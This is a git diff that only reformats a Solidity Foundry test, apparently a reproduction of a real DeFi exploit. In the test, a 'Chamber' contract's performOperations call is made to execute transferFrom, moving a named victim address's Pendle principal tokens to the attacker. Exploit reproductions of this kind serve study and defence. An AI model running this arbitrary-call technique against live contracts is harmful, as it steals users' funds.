@@ -13,20 +13,19 @@ import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 // https://twitter.com/Phalcon_xyz/status/1763045563040411876
 
 interface IChamber {
-    function performOperations(
-        uint8[] memory actions,
-        uint256[] memory values,
-        bytes[] memory datas
-    ) external payable returns (uint256 value1, uint256 value2);
+
+    function performOperations(uint8[] memory actions, uint256[] memory values, bytes[] memory datas)
+        external
+        payable
+        returns (uint256 value1, uint256 value2);
+
 }
 
 contract ContractTest is Test {
-    IChamber private constant Chamber =
-        IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
-    IERC20 private constant PendlePrincipalToken =
-        IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
-    address private constant victim =
-        0x9CBF099ff424979439dFBa03F00B5961784c06ce;
+
+    IChamber private constant Chamber = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
+    IERC20 private constant PendlePrincipalToken = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
+    address private constant victim = 0x9CBF099ff424979439dFBa03F00B5961784c06ce;
     uint8 public constant OPERATION_CALL = 30;
 
     function setUp() public {
@@ -39,19 +38,9 @@ contract ContractTest is Test {
     function testExploit() public {
         // Datas
         uint256 amount = PendlePrincipalToken.balanceOf(victim);
-        bytes memory callData = abi.encodeWithSignature(
-            "transferFrom(address,address,uint256)",
-            victim,
-            address(this),
-            amount
-        );
-        bytes memory data = abi.encode(
-            address(PendlePrincipalToken),
-            callData,
-            uint256(0),
-            uint256(0),
-            uint256(0)
-        );
+        bytes memory callData =
+            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);
+        bytes memory data = abi.encode(address(PendlePrincipalToken), callData, uint256(0), uint256(0), uint256(0));
         bytes[] memory datas = new bytes[](1);
         datas[0] = data;
 
@@ -77,4 +66,5 @@ contract ContractTest is Test {
             PendlePrincipalToken.decimals()
         );
     }
+
 }
